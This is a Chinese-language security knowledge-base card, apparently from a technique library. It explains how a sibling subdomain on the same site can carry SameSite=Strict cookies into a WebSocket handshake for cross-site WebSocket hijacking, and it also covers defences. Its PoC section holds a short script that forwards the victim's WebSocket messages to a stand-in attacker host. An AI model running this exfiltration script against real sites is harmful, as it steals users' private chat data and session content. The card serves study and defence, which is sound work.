---
id: web-generic-csrf-samesite-strict-bypass-sibling-domain-cswsh
title: SameSite=Strict 绕过：兄弟子域同站 + 跨站 WebSocket 劫持（CSWSH）窃取会话数据
type: scenario
domain: web
path: web/generic/csrf
technique: samesite-strict-sibling-domain-cswsh
aliases:
- SameSite Strict 兄弟域绕过
- CSWSH
- 跨站 WebSocket 劫持
- sibling domain samesite bypass
- WebSocket CSRF
tags:
- web
- csrf
- samesite
- strict
- websocket
- cswsh
- sibling-domain
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V606
  verified_at: '2026-11-12T18:33:05+08:00'
  notes: 已对照原文 SameSite 绕过方式 2 正文核对（该节截图均为远程未下载）：同站兄弟域发起 WebSocket 握手携带 Strict Cookie、Origin 不校验则 CSWSH 外带聊天记录；卡片与原文一致。PoC 未执行。
---

## 一句话结论

SameSite 以“站点”（scheme + 可注册域名 TLD+1）为单位而不是 origin；当攻击者能控制与目标同站点的兄弟子域（如 `attacker.example.com` 对 `app.example.com`）时，从兄弟域发起的请求会被浏览器视为同站并携带 `SameSite=Strict` Cookie；若目标 WebSocket 握手只依赖 Cookie、不校验 Origin/Token，即可实施跨站 WebSocket 劫持（CSWSH）读取聊天记录等敏感数据。

## 原理

- **site 与 origin 的差异**：`app.example.com` 与 `attacker.example.com` 是不同 origin，但同属 `example.com` 这个 site（scheme 也要一致）。SameSite 判定用的是 site，因此从兄弟子域发起的请求对目标而言是 same-site，Strict Cookie 仍会发送。
- **WebSocket 握手的 CSRF 本质**：`new WebSocket('wss://target/chat')` 的握手是带 Cookie 的 HTTP GET；浏览器不实施同源策略阻止跨站 WebSocket 连接，服务端若不校验 `Origin`/Token，就会把攻击者页面当作已登录用户接入。
- **攻击条件**：攻击者需控制一个与目标同站的兄弟域。来源包括：子域接管（dangling DNS）、用户内容托管子域、云存储/ SaaS 自定义域、目标主域下的任意可控页面（XSS/上传）等。若是完全不同的 site，则 Strict Cookie 不会发送。
- **为什么成立**：SameSite 是“站点边界”级防御，无法区分同一站点内的不同子域；把敏感 WebSocket 暴露给同站任意子域，等于把信任边界扩大到整个可注册域名。
- **验证要点**：确认会话 Cookie 为 Strict；确认目标 WebSocket 握手在带 Cookie 时返回历史消息；确认攻击页所在子域与目标同站。

## 触发条件

- 目标使用 `SameSite=Strict`（或 Lax）会话 Cookie，且 WebSocket 认证仅依赖该 Cookie。
- 攻击者能控制与目标同 site 的兄弟子域（接管、用户内容、可上传页面等）。
- WebSocket 服务端不校验 `Origin` 头、不要求握手 Token/自定义头。
- WebSocket 会话中包含敏感数据（聊天记录、通知、令牌等）。

## 利用步骤

1. 确认目标 WebSocket 端点（如 `/chat`）在已登录时返回历史消息，且跨站页面可直接建立连接（无 Origin 校验）。
2. 寻找/取得同站兄弟子域的控制权；在其上托管攻击脚本。
3. 脚本建立 `wss://target/chat` 连接，发送协议要求的初始化消息（如 `READY`），把 `onmessage` 收到的数据通过 `fetch` 发到攻击者 Collaborator/服务器。
4. 诱导已登录受害者访问兄弟域上的攻击页；由于同站，握手携带 Strict Cookie，服务端返回受害者聊天历史。
5. 在攻击者侧收取外带数据；若只拿到新会话数据，说明 Cookie 未带上，检查子域是否真的同站、scheme 是否一致。
6. 验证：握手请求的 Cookie 头包含会话 Cookie，外带数据包含受害者历史消息。

## PoC

```html
<script>
  var ws = new WebSocket('wss://victim.example/chat');
  ws.onopen = function () { ws.send('READY'); };
  ws.onmessage = function (event) {
    fetch('https://attacker-collaborator.example', {
      method: 'POST', mode: 'no-cors', body: event.data
    });
  };
</script>
```

托管在攻击者控制的兄弟子域（与 `victim.example` 同属 `example` site），整段脚本可 URL 编码后作为利用服务器页面内容。

## 变体与关联

- [[web-generic-csrf-samesite-strict-bypass-client-side-redirect]]：另一条 Strict 绕过（同站客户端重定向）。
- [[web-generic-csrf-missing-token-state-changing-endpoint]]：普通 CSRF 基础。
- 关联 WebSocket 相关卡片（web/generic/websocket 目录）用于协议细节与利用。
- 变体：同站 XSS/任意页面也能发起带 Cookie 的请求，效果等同兄弟域；WebSocket 可换成 EventSource/SSE、postMessage 等。
- 边界：WebSocket 校验 Origin 或要求握手 Token、Cookie 为跨 site（不同可注册域）、攻击者无法控制同站子域时链断。

## 检测与防御

- 检测：WebSocket 握手缺少 `Origin` 白名单校验；跨站页面建立连接并外带数据；兄弟子域出现异常页面/接管。
- 防御：WebSocket 握手校验 `Origin` 白名单并绑定 CSRF Token；会话 Cookie 使用 `SameSite=Strict` 仅作纵深；监控并清理 dangling DNS/子域接管；敏感数据不通过仅凭 Cookie 认证的 WebSocket 推送。
- 响应：审计 WebSocket 连接来源与外带流量，排查同站子域信任面。
